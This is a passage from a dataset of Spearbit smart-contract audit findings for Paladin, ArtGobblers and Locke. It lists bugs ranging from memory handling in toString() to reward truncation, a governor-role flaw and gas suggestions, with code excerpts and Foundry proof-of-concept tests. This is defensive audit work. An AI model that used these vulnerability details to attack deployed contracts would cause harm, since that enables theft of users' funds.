["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Deflationary reward tokens are not handled uniformly across the protocol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The code base does not support rebasing/deflationary/inflationary reward tokens whose balance changes during transfers or over time. The necessary checks include at least verifying the amount of tokens transferred to contracts before and after the actual transfer to infer any fees/interest.", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Typo on comment", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "Across the codebase, there is a typo on the comment. The comment can be seen from the below. * @dev Returns the number of periods to come for a give nQuest", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Require statement with gauge_types function call is redundant", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The gauge_types function of the Curve reverts when an invalid gauge is given as a parameter, the QuestBoard: Invalid Gauge error message will not be seen in the QuestBoard contract. The documentation can be seen from the Querying Gauge and Type Weights. function createQuest(...) ... { ... require(IGaugeController(GAUGE_CONTROLLER).gauge_types(gauge) >= 0, \"QuestBoard: Invalid Gauge\"); ... }", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Missing setter function for the GAUGE_CONTROLLER", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "The GAUGE_CONTROLLER address is immutable and set in the constructor. If Curve adds a new version of the gauge controller, the value of GAUGE_CONTROLLER cannot be updated and the contract QuestBoard needs to be deployed again. address public immutable GAUGE_CONTROLLER; constructor(address _gaugeController, address _chest){ GAUGE_CONTROLLER = _gaugeController; ... }", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "Empty events emitted in killBoard() and unkillBoard() functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Paladin-Spearbit-Security-Review.pdf", "body": "When an event is emitted, it stores the arguments passed in for the transaction logs. Currently the Killed() and Unkilled() events are emitted without any arguments passed into them defeating the purpose of using an event.", "labels": ["Spearbit", "Paladin", "Severity: Informational"]}, {"title": "The claimGobbler function does not enforce the MINTLIST_SUPPLY on-chain", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "There is a public constant MINTLIST_SUPPLY (2000) that is supposed to represent the number of gobblers that can be minted by using merkle proofs. However, this is not explicitly enforced in the claimGobbler function and will need to be verified off-chain from the list of merkle proof data. The risk lies in the possibility of having more than 2000 proofs.", "labels": ["Spearbit", "ArtGobblers", "Severity: Low Risk"]}, {"title": "Feeding a gobbler to itself may lead to an infinite loop in the off-chain renderer", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "The contract allows feeding a gobbler to itself and while we do not think such action causes any issues on the contract side, it will nevertheless cause potential problems with the off-chain rendering for the gob- blers. The project explicitly allows feeding gobblers to other gobblers. In such cases, if the off-chain renderer is designed to render the inner gobbler, it would cause an infinite loop for the self-feeding case. Additionally, when a gobbler is fed to another gobbler the user will still own one of the gobblers. However, this is not the case with self-feeding,.", "labels": ["Spearbit", "ArtGobblers", "Severity: Low Risk"]}, {"title": "The function toString() does not manage memory properly", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "There are two issues with the toString() function: 1. It does not manage the memory of the returned string correctly. In short, there can be overlaps between memory allocated for the returned string and the current free memory. 2. It assumes that the free memory is clean, i.e., does not explicitly zero out used memory. Proof of concept for case 1: function testToStringOverwrite() public { string memory str = LibString.toString(1); uint freememptr; uint len; bytes32 data; uint raw_str_ptr; assembly { // Imagine a high level allocation writing something to the current free memory. // Should have sufficient higher order bits for this to be visible mstore(mload(0x40), not(0)) freememptr := mload(0x40) // Correctly allocate 32 more bytes, to avoid more interference mstore(0x40, add(mload(0x40), 32)) raw_str_ptr := str len := mload(str) data := mload(add(str, 32)) } emit log_named_uint(\"memptr: \", freememptr); emit log_named_uint(\"str: \", raw_str_ptr); emit log_named_uint(\"len: \", len); emit log_named_bytes32(\"data: \", data); } Logs: memptr: : 256 str: : 205 len: : 1 data: : 0x31000000000000000000000000000000000000ffffffffffffffffffffffffff The key issue here is that the function allocates and manages memory region [205, 269) for the return variable. However, the free memory pointer is set to 256. The memory between [256, 269) can refer to both the string and another dynamic type that's allocated later on. Proof of concept for case 2: 5 function testToStringDirty() public { uint freememptr; // Make the next 4 bytes of the free memory dirty assembly { let dirty := not(0) freememptr := mload(0x40) mstore(freememptr, dirty) mstore(add(freememptr, 32), dirty) mstore(add(freememptr, 64), dirty) mstore(add(freememptr, 96), dirty) mstore(add(freememptr, 128), dirty) } string memory str = LibString.toString(1); uint len; bytes32 data; assembly { freememptr := str len := mload(str) data := mload(add(str, 32)) } emit log_named_uint(\"str: \", freememptr); emit log_named_uint(\"len: \", len); emit log_named_bytes32(\"data: \", data); assembly { freememptr := mload(0x40) } emit log_named_uint(\"memptr: \", freememptr); } Logs: str: 205 len: : 1 data: : 0x31ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff memptr: : 256 In both cases, high level solidity will not have issues decoding values as this region in memory is meant to be empty. However, certain ABI decoders, notably Etherscan, will have trouble decoding them. Note: It is likely that the use of toString() in ArtGobblers will not be impacted by the above issues. However, these issues can become severe if LibString is used as a generic string library.", "labels": ["Spearbit", "ArtGobblers", "Severity: Low Risk"]}, {"title": "Consider migrating all require statements to Custom Errors for gas optimization, better UX, DX and code consistency", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "There is a mixed usage of both require and Custom Errors to handle cases where the transaction must revert. We suggest replacing all require instances with Custom Errors in order to save gas and improve user / developer experience. The following is a list of contract functions that still use require statements:  ArtGobblers mintLegendaryGobbler  ArtGobblers safeBatchTransferFrom  ArtGobblers safeTransferFrom  SignedWadMath wadLn  GobblersERC1155B balanceOfBatch  GobblersERC1155B _mint  GobblersERC1155B _batchMint  PagesERC721 ownerOf  PagesERC721 balanceOf  PagesERC721 approve  PagesERC721 transferFrom  PagesERC721 safeTransferFrom  PagesERC721 safeTransferFrom (overloaded version)", "labels": ["Spearbit", "ArtGobblers", "Severity: Gas Optimization"]}, {"title": "Minting of Gobbler and Pages can be further gas optimized", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "Currently, in order to mint a new Page or Gobbler users must have enough $GOO in their Goo contract balance. If the user does not have enough $GOO he/she must call ArtGobblers.removeGoo(amount) to remove the required amount from the Gobbler's balance and mint new $GOO. That $GOO will be successively burned to mint the Page or Gobbler. In the vast majority of cases users will never have $GOO in the Goo contract but will have their $GOO directly stacked inside their Gobblers to compound and maximize the outcome. Given these premises, it makes sense to implement a function that does not require users to make two distinct transactions to perform:  mint $GOO (via removeGoo).  burn $GOO + mint the Page/Gobbler (via mintFromGoo). 7 but rather use a single transaction that consumes the $GOO stacked on the Gobbler itself without ever minting and burning any $GOO from the Goo contract. By doing so, the user will perform the mint operation with only one transaction and the gas cost will be much lower because it does not require any interaction with the Goo contract.", "labels": ["Spearbit", "ArtGobblers", "Severity: Gas Optimization"]}, {"title": "Declare GobblerReserve artGobblers as immutable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "The artGobblers in the GobblerReserve can be declared as immutable to save gas. - ArtGobblers public artGobblers; + ArtGobblers public immutable artGobblers;", "labels": ["Spearbit", "ArtGobblers", "Severity: Gas Optimization"]}, {"title": "Neither GobblersERC1155B nor ArtGobblers implement the ERC-165 supportsInterface function", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "From the EIP-1155 documentation: Smart contracts implementing the ERC-1155 standard MUST implement all of the functions in the ERC1155 interface. Smart contracts implementing the ERC-1155 standard MUST implement the ERC- 165 supportsInterface function and MUST return the constant value true if 0xd9b67a26 is passed through the interfaceID argument. Neither GobblersERC1155B nor ArtGobblers are actually implementing the ERC-165 supportsInterface function. implementing the required ERC-165 supportsInterface function in the", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "LogisticVRGDA is importing wadExp from SignedWadMath but never uses it", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "The LogisticVRGDA is importing the wadExp function from the SignedWadMath library but is never used.", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Pages.tokenURI does not revert when pageId is the ID of an invalid or not minted token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "The current implementation of tokenURI in Pages is returning an empty string if the pageId specified by the user's input has not been minted yet (pageId > currentId). Additionally, the function does not correctly handle the case of a special tokenId equal to 0, which is an invalid token ID given that the first mintable token would be the one with ID equal to 1. The EIP-721 documentation specifies that the contract should revert in this case: Throws if _tokenId is not a valid NFT. URIs are defined in RFC 3986.", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Consider checking if the token fed to the Gobbler is a real ERC1155 or ERC721 token", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "The current implementation of ArtGobblers.feedArt function allows users to specify from the value of the bool isERC1155 input parameter if the id passed is from an ERC721 or ERC1155 type of token. Without checking if the passed nft address fully support ERC721 or ERC1155 these two problems could arise:  The user can feed to a Gobbler an arbitrary ERC20 token by calling gobblers.feedArt(1, address(goo), 100, false);. In this example, we have fed 100 $GOO to the gobbler.  By just implementing safeTransferFrom or transferFrom in a generic contract, the user can feed tokens that cannot later be rendered by a Dapp because they do not fully support ERC721 or ERC1155 standard.", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Rounding down in legendary auction leads to legendaryGobblerPrice being zero earlier than the auction interval", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "The expression below rounds down. startPrice * (LEGENDARY_AUCTION_INTERVAL - numMintedSinceStart)) / LEGENDARY_AUCTION_INTERVAL In particular, this expression has a value 0 when numMintedSinceStart is between 573 and 581 (LEGENDARY_- AUCTION_INTERVAL).", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Typos in code comments or natspec comments", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "Below is a list of typos encountered in the code base and / or natspec comments:  In both Pages.sol#L179 and Pages.sol#L188 replace compromise with comprise  In Pages.sol#L205 replace pages's URI with page's URI  In LogisticVRGDA.sol#L23 replace effects with affects  In VRGDA.sol#L34 replace actions with auctions  In ArtGobblers.sol#L54, ArtGobblers.sol#L745 and ArtGobblers.sol#L754 replace compromise with comprise  In ArtGobblers.sol#L606 remove the double occurrence of the word state  In ArtGobblers.sol#L871 replace emission's with emission  In ArtGobblers.sol#L421 replace gobblers is minted with gobblers are minted and until all legen- daries been sold with until all legendaries have been sold  In ArtGobblers.sol#L435-L436 replace gobblers where minted with gobblers were minted and if auc- tion has not yet started with if the auction has not yet started  In ArtGobblers.sol#L518 replace overflow we've got bigger problems with overflow, we've got big- ger problems  In ArtGobblers.sol#L775 and ArtGobblers.sol#L781 replace get emission emissionMultiple with get emissionMultiple", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Missing natspec comments for contract's constructor, variables or functions", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "Some of the contract's constructor variables and functions are missing natespec comments. Here is the full list of them:  Pages constructor  Pages getTargetSaleDay function  LibString toString function  MerkleProofLib verify function  SignedWadMath toWadUnsafe function  SignedWadMath unsafeWadMul function  SignedWadMath unsafeWadDiv function  SignedWadMath wadMul function  SignedWadMath wadDiv function  SignedWadMath wadExp function  SignedWadMath wadLn function  SignedWadMath unsafeDiv function  VRGDA constructor  LogisticVRGDA constructor  LogisticVRGDA getTargetDayForNextSale  PostSwitchVRGDA constructor  PostSwitchVRGDA getTargetDayForNextSale  GobblerReserve artGobblers  GobblerReserve constructor  GobblersERC1155B contract is missing natspec's coverage for most of the variables and functions  PagesERC721 contract is missing natspec's coverage for most of the variables and functions  PagesERC721 isApprovedForAll should explicity document the fact that the ArtGobbler contract is always pre-approved  ArtGobblers chainlinkKeyHash variable  ArtGobblers chainlinkFee variable  ArtGobblers constructor  ArtGobblers gobblerPrice miss the @return natspec  ArtGobblers legendaryGobblerPrice miss the @return natspec  ArtGobblers requestRandomSeed miss the @return natspec  ArtGobblers fulfillRandomness miss both the @return and @param natspec  ArtGobblers uri miss the @return natspec  ArtGobblers gooBalance miss the @return natspec  ArtGobblers mintReservedGobblers miss the @return natspec  ArtGobblers getGobblerEmissionMultiple miss the @return natspec 11  ArtGobblers getUserEmissionMultiple miss the @return natspec  ArtGobblers safeBatchTransferFrom miss all natspec  ArtGobblers safeTransferFrom miss all natspec  ArtGobblers transferUserEmissionMultiple miss @notice natspec", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Potential issues due to slippage when minting legendary gobblers", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "The price of a legendary mint is a function of the number of gobblers minted from goo. Because of the strict check that the price is exactly equal to the number of gobblers supplied, this can lead to slippage issues. That is, if there is a transaction that gets mined in the same block as a legendary mint, and before the call to mintLegendaryGobbler, the legendary mint will revert. uint256 cost = legendaryGobblerPrice(); if (gobblerIds.length != cost) revert IncorrectGobblerAmount(cost);", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Users who claim early have an advantage in goo production", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "The gobblers are revealed in ascending order of the index in revealGobblers. However, there can be cases when this favours users who were able to claim early: 1. There is the trivial case where a user who claimed a day earlier will have an advantage in gooBalance as their emission starts earlier. 2. For users who claimed the gobblers on the same day (in the same period between a reveal) the advantage depends on whether the gobblers are revealed in the same block or not. 1. If there is a large number of gobbler claims between two aforementioned gobblers, then it may not be possible to call revealGobblers, due to block gas limit. 2. A user at the beginning of the reveal queue may call revealGobblers for enough indices to reveal their gobbler early. In all of the above cases, the advantage is being early to start the emission of the Goo.", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Add a negativity check for decayConstant in the constructor", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "Price is designed to decay as time progresses. For this, it is important that the constant decayCon- stant is negative. Since the value is derived using an on-chain logarithm computation once, it is useful to check that the value is negative. Also, typically decay constant is positive, for example, in radioactive decay the negative sign is explicitly added in the function. It is worth keeping the same convention here, i.e., keep decayConstant as a positive number and add the negative sign in getPrice function. However, this may cause a small increase in gas and therefore may not be worth implementing in the end.", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Consideration on possible Chainlink integration concerns", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "The ArtGobbler project relies on the Chainlink v1 VRF service to reveal minted gobblers and assign a random emissionMultiple that can range from 6 to 9. The project has estimated that minting and revealing all gobblers will take about 10 years. In the scenario simulated by the discussion \"Test to mint and reveal all the gobblers\" the number of requestRan- domSeed and fulfillRandomness made to reveal all the minted gobblers were more than 1500. Given the timespan of the project, the number of requests made to Chainlink to request a random number and the fundamental dependency that Chainlink VRF v1 has, we would like to highlight some concerns:  What would happen if Chainlink completely discontinues the Chainlink VRF v1? At the current moment, Chainlink has already released VRF v2 that replaces and enhances VRF v1.  What would happen in case of a Chainlink service outage and for some reason they decide not to pro- cess previous requests? Currently, the ArtGobbler contract does not allow to request a new \"request for randomness\". 13  What if the fulfillRandomness always gets delayed by a long number of days and users are not able to reveal their gobblers? This would not allow them to know the value of the gobbler (rarity and the visual representation) and start compounding $GOO given the fact that the gobbler does not have an emission multiple associated yet.  What if for error or on purpose (malicious behavior) a Chainlink operator calls fulfillRandomness multi- ple times changing the randomSeed during a reveal phase (the reveal of X gobbler can happen in multiple stages)?", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "The function toString() does not return a string aligned to a 32-byte word boundary", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "It is a good practice to align memory regions to 32-byte word boundaries. This is not necessarily the case here. However, we do not think this can lead to issues.", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Considerations on Legendary Gobbler price mechanics", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "The auction price model is made in a way that starts from a startPrice and decays over time. Each time a new action starts the price time will be equal to max(69, prevStartPrice * 2). Users in this case are incentivized to buy the legendary gobbler as soon as the auction starts because by doing so they are going to burn the maximum amount allowed of gobblers, allowing them to maximize the final emission multiple of the minted legendary gobbler. By doing this, you reach the end goal of maximizing the account's $GOO emissions. By waiting, the cost price of the legendary gobbler decays, and it also decays the emission multiple (because you can burn fewer gobblers). This means that if a user has enough gobblers to burn, he/she will burn them as soon as the auction starts. Another reason to mint a legendary gobbler as soon as the auction starts (and so burn as many gobblers as possible) is to make the next auction starting price as high as possible (always for the same reason, to be able to maximize the legendary gobbler emissions multiple). The next auction starting price is determined by legendaryGobblerAuctionData.startPrice = uint120(cost < 35 ? 69 : cost << 1); These mechanisms and behaviors can result in the following consequences:  Users that will have a huge number of gobblers will burn them as soon as possible, disallowing others that can't afford it to wait for the price to decay.  There will be less and less \"normal\" gobblers available to be used as part of the \"art\" aspect of the project. In the discussion \"Test to mint and reveal all the gobblers\" we have simulated a scenario in which a whale would be interested to collect all gobblers with the end goal of maximizing $GOO production. In that scenario, when the last Legendary Gobbler is minted we have estimated that 9644 gobbler have been burned to mint all the legendaries. 14", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Define a LEGENDARY_GOBBLER_INITIAL_START_PRICE constant to be used instead of hardcoded 69", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "69 is currently the starting price of the first legendary auction and will also be the price of the next auction if the previous one (that just finished) was lower than 35. There isn't any gas benefit to use a constant variable but it would make the code cleaner and easier to read instead of having hard-coded values directly.", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Update ArtGobblers comments about some variable/functions to make them more clear", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "Some comments about state variables or functions could be improved to make them clearer or remove any further doubts. LEGENDARY_AUCTION_INTERVAL /// @notice Legendary auctions begin each time a multiple of these many gobblers have been minted. It could make sense that this comment specifies \"minted from Goo\" otherwise someone could think that also the \"free\" mints (mintlist, legendary, reserved) could count to determine when a legendary auction start. EmissionData.lastTimestamp // Timestamp of last deposit or withdrawal. These comments should be updated to cover all the scenarios where lastBalance and lastTimestamp are up- dated. Currently, they are updated in many more cases for example:  mintLegendaryGobbler  revealGobblers  transferUserEmissionMultiple getGobblerData[gobblerId].emissionMultiple = uint48(burnedMultipleTotal << 1) has an outdated comment. The current present in the mintLegendaryGobbler function has the following comment: line getGobblerData[gobblerId].emissionMultiple = uint48(burnedMultipleTotal << 1) // Must be done before minting as the transfer hook will update the user's emissionMultiple. In both ArtGobblers and GobblersERC1155B there isn't any transfer hook, which could mean that the referred comment is referencing outdated code. We suggest removing or updating the comment to reflect the current code implementation. legendaryGobblerPrice numMintedAtStart calculation. 15 The variable numMintedAtStart is calculated as (numSold + 1) * LEGENDARY_AUCTION_INTERVAL The comment above the formula does not explain why it uses (numSold + 1) instead of numSold. This reason is correctly explained by a comment on LEGENDARY_AUCTION_INTERVAL declaration. It would be better to also update the comment related to the calculation of numMintedAtStart to explain why the current formula use (numSold + 1) instead of just numSold transferUserEmissionMultiple The above utility function transfers an amount of a user's emission's multiple to another user. Other than transfer- ring that emission amount, it also updates both users lastBalance and lastTimestamp The natspec comment should be updated to cover this information.", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "Mark functions not called internally as external to improve code quality", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/ArtGobblers-Spearbit-Security-Review.pdf", "body": "The following functions could be declared as external to save gas and improve code quality:  Goo.mintForGobblers  Goo.burnForGobblers  Goo.burnForPages  GobblerReserve.withdraw", "labels": ["Spearbit", "ArtGobblers", "Severity: Informational"]}, {"title": "UnaccruedSeconds do not increase even if nobody is actively staking", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "The unstreamed variable tracks whether someone is staking in the contract or not. However, because of the division precision loss at Locke.sol#L164-L166 and Locke.sol#L187, unstreamed > 0 may happen even when everyone has already withdrawn all deposited tokens from the contract, i.e. ts.token = 0 for everyone. Consider the following proof of concept with only two users, Alice and Bob:  streamDuration = 8888  At t = startTime, Alice stakes 1052 wei of deposit tokens.  At t = startTime + 99, Bob stakes 6733 wei of deposit tokens.  At t = startTime + 36, both Alice and Bob exits from the contract. At this point Alices and Bobs ts.tokens are both 0 but unstreamed = 1 wei. The abovementined numbers are the resault of a fuzzing campaign and were not carefully crafted, therefore this issue can also occur under normal circumstances. function updateStreamInternal() internal { ... uint256 tdelta = timestamp - lastUpdate; if (tdelta > 0) { if (unstreamed == 0) { unaccruedSeconds += uint32(tdelta); } else { unstreamed -= uint112(tdelta * unstreamed / (endStream - lastUpdate)); } } ... }", "labels": ["Spearbit", "Locke", "Severity: High Risk"]}, {"title": "Old governor can call acceptGov() after renouncing its role through _abdicate()", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "The __abdicate function does not reset pendingGov value to 0. Therefore, if a pending governor is set the user can become a governor by calling acceptGov.", "labels": ["Spearbit", "Locke", "Severity: High Risk"]}, {"title": "User can lose their reward due truncated division", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "The truncated division can cause users to lose rewards in this update round which may happen when any of the following conditions are true: 1. RewardToken.decimals() is too low. 2. Reward is updated too frequently. 3. StreamDuration is too large. 4. TotalVirtualBalance is too large (e.g., stake near the end of stream). This could potentially happen especially when the 1st case is true. Consider the following scenario:  rewardToken.decimals() = 6.  depositToken.decimals() can be any (assume its 18).  rewardTokenAmount = 1K * 10**6.  streamDuration = 1209600 (two weeks).  totalVirtualBalance = streamDuration * depositTokenAmount / timeRemaining where depositToken- Amount = 100K 10**18 and timeRemaining = streamDuration (a user stakes 100K at the beginning of the stream) lastApplicableTime() - lastUpdate = 100 (about 7 block-time). Then rewards = 100 * 1000 * 10**6 * 10**18 / 1209600 / (1209600 * 100000 * 10**18 / 1209600) = 0.8267 < 1. User wants to buy the reward token at the price of 100K/1K = 100 deposit token but does not get any because of the truncated division. function rewardPerToken() public override view returns (uint256) { if (totalVirtualBalance == 0) { return cumulativeRewardPerToken; } else { // time*rewardTokensPerSecond*oneDepositToken / totalVirtualBalance uint256 rewards; unchecked { rewards = (uint256(lastApplicableTime() - lastUpdate) * rewardTokenAmount * ,! depositDecimalsOne) / streamDuration / totalVirtualBalance; } return cumulativeRewardPerToken + rewards; } }", "labels": ["Spearbit", "Locke", "Severity: High Risk"]}, {"title": "The streamAmt check may prolong a user in the stream", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Assume that the amount of tokens staked by a user (ts.tokens) is low. This check allows another person to deposit a large stake in order to prolong the user in a stream (untilstreamAmt for the user becomes non-zero). For this duration the user would be receiving a bad rate or 0 altogether for the reward token while being unable to exit from the pool. if (streamAmt == 0) revert ZeroAmount(); Therefore, if Alice stakes a small amount of deposit token and Bob comes along and deposits a very large amount of deposit token, tts in Alices interest to exit the pool as early as possible especially when this is an indefinite stream. Otherwise the user would be receiving a bad rate for their deposit token.", "labels": ["Spearbit", "Locke", "Severity: Medium Risk"]}, {"title": "User can stake before the stream creator produced a funding stream", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Consider the following scenario: 1. Alice stakes in a stream before the stream starts. 2. Nobody funds the stream,. 3. In case of an indefinite stream Alice loses some of her deposit depending on when she exits the stream. For a usual stream Alice will have her deposit tokens locked until endDepositLock.", "labels": ["Spearbit", "Locke", "Severity: Medium Risk"]}, {"title": "Potential funds locked due low token decimal and long stream duration", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "In case where the deposit token decimal is too low (4 or less) or when the remaining stream duration is too long, checking streamAmt > 0 may affect regular users. They could be temporarily blocked by the contract, i.e. they cannot stake, withdraw, or get rewards, and should wait until streamAmt > 0 or the stream ends. Altough unlikely to happen it still is a potential lock of funds issue. 11 function updateStreamInternal() internal { ... if (acctTimeDelta > 0) { if (ts.tokens > 0) { uint112 streamAmt = uint112(uint256(acctTimeDelta) * ts.tokens / (endStream - ,! ts.lastUpdate)); if (streamAmt == 0) revert ZeroAmount(); ts.tokens -= streamAmt; } ... }", "labels": ["Spearbit", "Locke", "Severity: Medium Risk"]}, {"title": "Sanity check on the reward tokens decimals", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Add sanity check on the reward tokens decimals, which shouldnt exceed 33 because Token- Stream.rewards has a uint112 type. constructor( ) { uint64 _streamId, address creator, bool _isIndefinite, address _rewardToken, address _depositToken, uint32 _startTime, uint32 _streamDuration, uint32 _depositLockDuration, uint32 _rewardLockDuration, uint16 _feePercent, bool _feeEnabled LockeERC20( _depositToken, _streamId, _startTime + _streamDuration + _depositLockDuration, _startTime + _streamDuration, _isIndefinite ) MinimallyExternallyGoverned(msg.sender) // inherit factory governance // No error code or msg to reduce bytecode size require(_rewardToken != _depositToken); // set fee info feePercent = _feePercent; feeEnabled = _feeEnabled; // limit feePercent require(feePercent < 10000); // store streamParams startTime = _startTime; streamDuration = _streamDuration; // set in shared state 12 endStream = startTime + streamDuration; endDepositLock = endStream + _depositLockDuration; endRewardLock = startTime + _rewardLockDuration; // set tokens depositToken = _depositToken; rewardToken = _rewardToken; // set streamId streamId = _streamId; // set indefinite info isIndefinite = _isIndefinite; streamCreator = creator; uint256 one = ERC20(depositToken).decimals(); if (one > 33) revert BadERC20Interaction(); depositDecimalsOne = uint112(10**one); // set lastUpdate to startTime to reduce codesize and first users gas lastUpdate = startTime; }", "labels": ["Spearbit", "Locke", "Severity: Low Risk"]}, {"title": "Use a stricter bound for transferability delay", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "modifier transferabilityDelay { // ensure the time is after end stream if (block.timestamp < endStream) revert NotTransferableYet(); _; }", "labels": ["Spearbit", "Locke", "Severity: Low Risk"]}, {"title": "Potential issue with malicious stream creator", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Assume that users staked tokens at the beginning. The malicious stream creator could come and stake an extremely large amount of tokens thus driving up the value of totalVirtualBalance. This means that users will barely receive rewards while giving away deposit tokens at the same rate. Users can exit the pool in this case to save their unstreamed tokens. 13 function rewardPerToken() public override view returns (uint256) { if (totalVirtualBalance == 0) { return cumulativeRewardPerToken; } else { unchecked { rewards = (uint256(lastApplicableTime() - lastUpdate) * rewardTokenAmount * ,! depositDecimalsOne) / streamDuration / totalVirtualBalance; } return cumulativeRewardPerToken + rewards; } }", "labels": ["Spearbit", "Locke", "Severity: Low Risk"]}, {"title": "Moving check require(feePercent < 10000) in updateFeeParams to save gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "feePercent comes directly from LockeFactorys feeParams.feePercent, which is configured in the updateFeeParams function and used across all Stream contracts. Moving this check into the updateFeeParams function can avoid checking in every contract and thus save gas.", "labels": ["Spearbit", "Locke", "Severity: Gas Optimization"]}, {"title": "Use calldata instead of memory for some function parameters", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Having function arguments in calldata instead of memory is more optimal in the aforementioned cases. See the following reference.", "labels": ["Spearbit", "Locke", "Severity: Gas Optimization"]}, {"title": "Update cumulativeRewardPerToken only once after stream ends", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "Since cumulativeRewardPerToken does not change once it is updated after the stream ends, it has to be updated only once.", "labels": ["Spearbit", "Locke", "Severity: Gas Optimization"]}, {"title": "Expression 10**one can be unchecked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "uint256 one = ERC20(depositToken).decimals(); if (one > 33) revert BadERC20Interaction(); depositDecimalsOne = uint112(10**one)", "labels": ["Spearbit", "Locke", "Severity: Gas Optimization"]}, {"title": "Calculation of amt can be unchecked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Locke-Spearbit-Security-Review.pdf", "body": "The value newBal in this context is always greater than prevBal because of the check located at Locke.sol#534. Therefore, we can use unchecked subtraction.", "labels": ["Spearbit", "Locke", "Severity: Gas Optimization"]}, {"title": "Change lastApplicableTime() to endStream", 